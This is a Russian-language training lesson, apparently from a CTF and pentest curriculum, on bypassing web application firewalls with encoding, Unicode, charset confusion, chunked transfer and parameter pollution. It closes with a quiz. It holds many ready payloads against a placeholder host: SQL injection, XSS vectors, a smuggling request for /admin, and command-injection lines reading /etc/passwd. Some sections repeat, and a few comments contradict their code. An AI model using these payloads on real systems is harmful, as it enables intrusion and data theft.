---
id: web-waf-bypass-advanced
title: "WAF bypass advanced: encoding, Unicode, charset, chunked"
category: web
parent: web-waf-parsing-attacks
difficulty: hard
order: 3
tags: [waf, bypass, encoding, charset, chunked, obfuscation]
prerequisites: [web-waf-bypass]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 42
summary: "Продвинутый обход WAF: многослойное кодирование, Unicode/overlong, charset confusion, chunked/TE, HPP и нормализация."
---

Продвинутый обход WAF — это эксплуатация **расхождений** между тем, как WAF разбирает запрос, и тем, как его разбирает бэкенд. Базовое «заменить пробел на `/**/`» знают все; здесь — многослойное кодирование, Unicode/charset-путаница, chunked/TE, HPP и регистр. Цель — заставить WAF увидеть «безобидную» строку, а бэкенд — вредоносную.

## Теория: где рассогласование

WAF и приложение могут по-разному: декодировать URL, обрабатывать `%uXXXX`, читать charset из `Content-Type`, трактовать дублированные параметры, резать по `;`/`&`. Атака — найти вход, который WAF пропустит, а бэкенд декодирует в полезную нагрузку.

## Техника 1: многослойное кодирование

- URL-encode: `'` → `%27`.
- Double URL-encode: `%2527` → бэкенд декодирует дважды → `'`.
- Mixed: `%27`, `%u0027` (IIS), `%%32%37`.
- HTML-entity в XSS: `&#x27;`, `&apos;`.
- Base64/hex, если бэкенд декодирует.

```text
id=1%2527%2520OR%25201=1
```

## Техника 2: Unicode / overlong / homoglyph

- Fullwidth: `＜script＞` (NFKC → `<script>`).
- Overlong UTF-8: `%c0%af` → `/`.
- Homoglyph: кириллические `а`,`е`,`о`.
- Идеографическая точка `。`, fullwidth точка `．`.
- Zero-width: U+200B/U+FEFF разрывают сигнатуры.

(Подробно — в `web-unicode-normalization`.)

## Техника 3: charset confusion

Если `Content-Type: application/x-www-form-urlencoded; charset=<X>`, а WAF и бэкенд понимают charset по-разному, можно закодировать payload в нестандартном charset (например, `ibm037`, `utf-7`), который WAF не декодирует. Классика — **UTF-7 XSS**:

```text
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

## Техника 4: chunked / TE

- `Transfer-Encoding: chunked` с «мусорными» чанками, которые WAF игнорирует, а бэкенд собирает.
- Обфускация TE: `Transfer-Encoding: chunked, identity`, `Transfer-Encoding : chunked` (пробел перед `:`), `X-Transfer-Encoding`.
- Смешение `Content-Length` и `Transfer-Encoding` (см. `web-request-smuggling`).

## Техника 5: HPP и параметры

- Дубли параметра: WAF берёт первый, бэкенд — последний (см. `web-http-parameter-pollution`).
- Параметры в query и body одновременно.
- Массивы: `id[]=1&id[]=2`.
- Скрытые параметры (`Param Miner`).

## Техника 6: пробелы/комментарии/регистр

- SQL: `/**/` вместо пробела, `UNION/**/SELECT`, `/*!50000SELECT*/`, `%09`/`%0a` (tab/LF).
- Регистр: `SeLeCt`, `sCrIpT`, `<ScRiPt>`, `#EXEC`.
- Разделители: `|`, `||`, `+`, `-` (MySQL comment `-- -`, `#`, `--`).
- Ключевые слова: `SEL/**/ECT`, `UNI/**/ON`.

## Разобранный пример: обход WAF на SQLi

Цель: `GET /item?id=1`, WAF блокирует `UNION SELECT` и пробелы.

Шаг 1 — базовый блок:

```bash
curl -s "https://app.example/item?id=1 UNION SELECT 1,2"   # 403
```

Шаг 2 — комментарии и регистр:

```bash
curl -s "https://app.example/item?id=1%20UNION/**/SELECT/**/1,2"
curl -s "https://app.example/item?id=1%20uNiOn/**/sElEcT/**/1,2"
curl -s "https://app.example/item?id=1/**/union/*!50000select*/1,2,3"
```

Шаг 3 — если прошло, дальше по `web-tool-sqlmap` (`--tamper=space2comment,between,randomcase`).

## Разобранный пример: обход XSS-фильтра

Фильтр блокирует `<script>` и `alert`:

```html
＜script＞confirm(1)＜/script＞
<img src=x onerror=confirm(1)>
<svg/onload=confirm(1)>
<iframe src=javascript:confirm(1)>
<a href="jAvAsCrIpT:confirm(1)">x</a>
<scr<script>ipt>confirm(1)</scr</script>ipt>
```

NFKC/fullwidth/регистр/вложенные теги — базовые обходы.

## Инструменты

- **Burp** + `Bypass WAF`/`nowafpls` (padding) — обходы.
- **`wafw00f`** — определение WAF.
- **`sqlmap --tamper`** — SQLi-обход.
- **`xsser`/`dalfox`** — XSS-обход.
- **`h2c`/smuggling-скрипты** — TE-обходы.

## Что дальше / decision

1. Есть WAF → определите его (`wafw00f`), поймите, что блокирует.
2. Блокирует пробелы/ключевые слова → комментарии/регистр/`%09`.
3. Блокирует теги → fullwidth/NFKC/регистр/вложенность.
4. Блокирует по декодированию → многослойное кодирование/charset.
5. Дальше — эксплуатируйте инъекцию (sqlmap/xss) с обходом.

## Техника 7: обход через нормализацию и «мусор»

- **Лишние параметры/мусор** (padding): тысячи «безобидных» параметров перед полезным — WAF сдаётся по размеру.
- **`nowafpls`** (Burp) — вставка padding в тело/путь.
- **Нестандартные пробелы:** `%0b`, `%0c`, `%a0`, `%85` вместо `%20`.
- **Двойные заголовки:** `Content-Type` дважды (WAF берёт один, бэкенд — другой).
- **Обход по нормализации:** WAF нормализует, бэкенд — нет (и наоборот).

## Разобранный пример: обход фильтра на командах

Фильтр блокирует `;`/`|`/`&&`/`$()`:

```bash
curl -s "https://app.example/ping?host=127.0.0.1%0aid"          # %0a (LF) как разделитель
curl -s "https://app.example/ping?host=127.0.0.1%0d%0aid"       # CRLF
curl -s "https://app.example/ping?host=127.0.0.1%09|id"         # tab
curl -s "https://app.example/ping?host=127.0.0.1\`id\`"         # backticks
curl -s "https://app.example/ping?host=127.0.0.1%24%7BIFS%7Did" # $IFS
```

`$IFS` заменяет пробел, а `%0a`/`%09` — разделители команд. Обходы зависят от того, как именно фильтр нормализует ввод.

## Частые ошибки

- **Кодировать один раз.** Часто нужно дважды.
- **Забыть про charset.** UTF-7/ibm037 обходят декодер.
- **Игнорировать TE/chunked.** Расхождение WAF/бэкенда.
- **Сдаваться после 403.** Пробуйте HPP/регистр/комментарии.
- **Ломать прод.** Флуд обходами — аккуратно.

## Полная таблица кодирований для обхода WAF

WAF и бэкенд по-разному декодируют вход — на этом строится большинство байпасов.

| Техника | Пример | Обходит |
|---------|--------|---------|
| URL-кодирование | `%27` | regex по `'` |
| Двойное | `%2527` | один проход декодирования |
| Unicode | `%u0027` | наивные фильтры |
| HTML-entity | `&#39;` | XSS-фильтры |
| Hex | `0x27` | SQL-фильтры |
| Base64 | `Jy` | редко, для параметров |
| Overlong UTF-8 | `%C0%A7` | старые парсеры |
| UTF-16/32 | `%00%27` | кодировка тела |
| Mixed case | `SeLeCt` | регистро-зависимые |
| Комментарии | `SEL/**/ECT` | токен-фильтры |
| Whitespace | `%09%0a` | пробел-фильтры |
| Смешение | `%27%2f**/` | многослойные |

```bash
# пример обхода SQLi-фильтра
curl -s "https://app.example/?id=1%2527%2520OR%25201=1--"
# пример обхода XSS
curl -s "https://app.example/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
```

## Charset confusion и заголовок Content-Type

Смена кодировки тела заставляет WAF и бэкенд читать разные символы.

```bash
# объявляем UTF-16, а шлём «мусор», который после декодирования даёт payload
curl -s -X POST https://app.example/ \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' \
  --data-binary $'\x81\xa2\xa2...'
# или UTF-7 для XSS
curl -s 'https://app.example/?q=+ADw-script+AD4-alert(1)+ADw-/script+AD4-'
```

WAF может не поддерживать `ibm037`/UTF-7 и пропустить запрос «как есть», а бэкенд — декодировать в валидный payload.

## Chunked / TE и request smuggling

Расхождение в обработке `Transfer-Encoding` — сильный WAF-байпас и основа smuggling.

```http
POST / HTTP/1.1
Host: app.example
Transfer-Encoding: chunked
Content-Length: 6

0

GET /admin HTTP/1.1
```

```bash
# проверка через curl с chunked
curl -s -X POST https://app.example/ -H 'Transfer-Encoding: chunked' \
  --data-binary $'5\r\nhello\r\n0\r\n\r\n'
# TE.TE / TE.CL / CL.0 варианты — см. web-request-smuggling
```

WAF видит один запрос, бэкенд — два; вредоносный уходит «за» фильтром.

## Разобранный пример: обход XSS-фильтра

```bash
# фильтр режет <script> и onerror=, но не декодирует HTML-entity дважды
curl -s 'https://app.example/?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(1)%26gt%3B'
# вывод в теле содержит <img src=x onerror=alert(1)>
```

```bash
# обход через нестандартный разделитель атрибута
curl -s 'https://app.example/?q=<svg%09onload=alert(1)>'
curl -s 'https://app.example/?q=<svg/onload=alert(1)>'
```

## Разобранный пример: обход фильтра на командах

```bash
# фильтр блокирует 'cat' и ';'
curl -s 'https://app.example/ping?ip=127.0.0.1%0ac%61t%20/etc/passwd'
# %0a -> newline (разделитель команд), c\61t -> cat через shell-escape
curl -s 'https://app.example/ping?ip=127.0.0.1%0a/???/c?t${IFS}/etc/passwd'
```

`${IFS}` заменяет пробел, wildcard `?` обходит список запрещённых слов, newline — разделитель.

## Инструменты

| Инструмент | Назначение |
|-----------|-----------|
| `wafw00f` | определить WAF |
| `Burp` + плагины | ручной обход |
| `nuclei -tags waf` | шаблоны |
| `bypass-firewalls-by-DNS-history` | origin-IP |
| `sqlmap --tamper` | автоматический обход |

```bash
wafw00f https://app.example
sqlmap -u 'https://app.example/?id=1' --tamper=space2comment,between --batch
```

## Что делать дальше / решение

1. **Определите WAF.** `wafw00f`, поведение при атаке.
2. **Найдите расхождение.** Кодирование, charset, TE.
3. **Примените таблицу.** Перебирайте кодировки и разделители.
4. **Проверьте smuggling.** TE.CL/CL.TE, chunked.
5. **Комбинируйте.** HPP + кодирование + комментарии.
6. **Зафиксируйте PoC.** Payload, прошедший фильтр и сработавший.

## Практика и справочники

- **PortSwigger Academy** — «WAF bypass»/smuggling.
- **HackTricks** — «WAF bypass».
- **PayloadsAllTheThings** — «WAF bypass».
- **`sqlmap` tamper scripts** — готовые обходы.

## Приоритеты при обходе WAF

Начните с определения WAF (`wafw00f`) и его поведения на безобидную атаку. Затем ищите **рассогласование** — место, где фильтр и бэкенд по-разному видят вход: кодировка тела (`charset`), `Transfer-Encoding`, дублирование параметров, нормализация пути. Именно рассогласование, а не «хитрый payload», даёт стабильный обход. Комбинируйте техники: кодирование + комментарии + нестандартные разделители + HPP. И всегда проверяйте, что payload реально сработал (не только «прошёл фильтр»).

## Кратко

1. Определите WAF и правило.
2. Найдите расхождение (кодировка/TE/HPP).
3. Примените таблицу кодирований.
4. Проверьте smuggling (TE.CL/CL.TE).
5. Комбинируйте слои.
6. PoC — payload, прошедший фильтр и сработавший.

## Практика

- **PortSwigger Academy** — WAF bypass и smuggling.
- **HackTricks** — WAF bypass.
- **sqlmap `--tamper`** — готовые обходы для SQLi.

## Дополнительно: как не потратить время зря

Главная ошибка — перебирать «красивые» payload'ы, не определив, **что именно** фильтрует WAF. Сначала посмотрите, на какой символ/слово срабатывает блок (ответ 403, страница WAF, задержка). Затем ищите способ обойти именно это правило, а не весь WAF целиком. Часто достаточно одного нестандартного разделителя (`%0a`, `%09`, `/**/`) или кодировки. И фиксируйте, что payload дошёл до бэкенда — иначе обход WAF без последующей эксплуатации бессмысленен.

## Пример: обход фильтра на пробелы в SQLi

```bash
# блокируется обычный пробел -> используем комментарий
curl -s "https://app.example/?id=1/**/UNION/**/SELECT/**/1,2,3"
# блокируется /**/ -> используем таб/новую строку
curl -s "https://app.example/?id=1%09UNION%0aSELECT%0d1,2,3"
# блокируется UNION SELECT целиком -> регистр + комментарии
curl -s "https://app.example/?id=1+UnIoN%09SeLeCt+1,2,3"
```

Вывод: обход строится на конкретном правиле, а не на универсальном списке.

## Ещё одна проверка

Учитывайте нормализацию на стороне WAF: некоторые нормализуют Unicode/проценты **до** проверки, другие — нет. Сравните поведение при `%2e%2e`, `%c0%ae`, `%u002e` и полноширинных символах — там, где WAF и бэкенд нормализуют по-разному, появляется стабильный обход.

## Финальная заметка

Обход WAF — не самоцель, а способ довести уже найденную уязвимость до эксплуатации. Если WAF мешает, но вы понимаете правило, обход обычно занимает минуты. Если же вы просто перебираете payload'ы без гипотезы — остановитесь и определите правило фильтрации.

## Квиз

```quiz
- question: "На чём основан обход WAF?"
  options:
    - "На скорости"
    - "На рассогласовании парсеров WAF и приложения"
    - "На TLS"
    - "На cookie"
  answer: 1
  explanation: "WAF декодирует иначе, чем бэкенд."
- question: "Что такое двойное кодирование?"
  options:
    - "Дважды шифровать"
    - "%2527 декодируется WAF в %27, приложением — в '"
    - "Два запроса"
    - "Два cookie"
  answer: 1
  explanation: "WAF декодирует один раз, приложение — два."
- question: "Чем полезна смена charset?"
  options:
    - "Ускоряет"
    - "WAF читает байты как ASCII, приложение декодирует в payload"
    - "Шифрует"
    - "Кеширует"
  answer: 1
  explanation: "Charset confusion."
- question: "Как обфусцировать SQL-ключевые слова?"
  options:
    - "Никак"
    - "Комментариями /**/, регистром, табами/переводами строк"
    - "Base64"
    - "Cookie"
  answer: 1
  explanation: "WAF-сигнатуры обходят."
- question: "Что делает Transfer-Encoding: chunked для обхода?"
  options:
    - "Сжимает"
    - "WAF может не собрать тело, а приложение соберёт"
    - "Шифрует"
    - "Кеширует"
  answer: 1
  explanation: "Рассогласование разбора тела."
```

## Где пригодится

- **CTF (Web):** обход фильтров.
- **Bug bounty:** WAF bypass — путь к уязвимости.
- **Пентест:** обход защиты периметра.
- **Работа (AppSec/Blue):** нормализация на одном слое, единые парсеры, проверка после декодирования.
